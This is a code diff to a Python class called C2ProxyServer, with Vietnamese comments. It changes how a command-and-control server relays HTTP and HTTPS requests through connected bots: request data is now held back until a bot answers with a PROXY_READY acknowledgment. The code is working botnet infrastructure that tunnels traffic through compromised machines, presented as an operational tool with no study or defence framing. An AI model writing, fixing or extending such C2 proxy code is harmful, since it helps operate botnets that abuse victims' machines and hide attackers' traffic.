@@ -840,13 +840,11 @@ class C2ProxyServer:
             print(f"📤 Sending to bot {bot_id}: {command.strip()}")
             bot_socket.sendall(command.encode())
 
-            # Gửi frame DATA đầu tiên (cho cả HTTP và HTTPS)
+            # Chờ bot acknowledgment trước khi gửi DATA
             if request_data:
-                print(f"📤 Sending initial DATA frame to bot {bot_id} for {'HTTPS' if connection['is_https'] else 'HTTP'} request")
-                # Small delay to ensure bot creates connection first
-                import time
-                time.sleep(0.1)
-                self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
+                print(f"⏳ Waiting for bot {bot_id} to be ready for {'HTTPS' if connection['is_https'] else 'HTTP'} request")
+                # Store request data to send after acknowledgment
+                connection['pending_data'] = request_data
             else:
                 print(f"⚠️  No request data to send to bot")
 
@@ -1000,6 +998,16 @@ class C2ProxyServer:
                         except Exception:
                             pass
                         self.cleanup_proxy_connection(cid)
+                elif header.startswith("PROXY_READY:"):
+                    parts = header.split(":")
+                    if len(parts) >= 2:
+                        cid = parts[1]
+                        if cid in self.active_proxy_connections:
+                            connection = self.active_proxy_connections[cid]
+                            if 'pending_data' in connection:
+                                print(f"📤 Bot ready, sending pending data for {cid}")
+                                self._send_data_frame_to_bot(bot_socket, cid, connection['pending_data'])
+                                del connection['pending_data']
                 else:
                     # Ignore unknown headers
                     pass
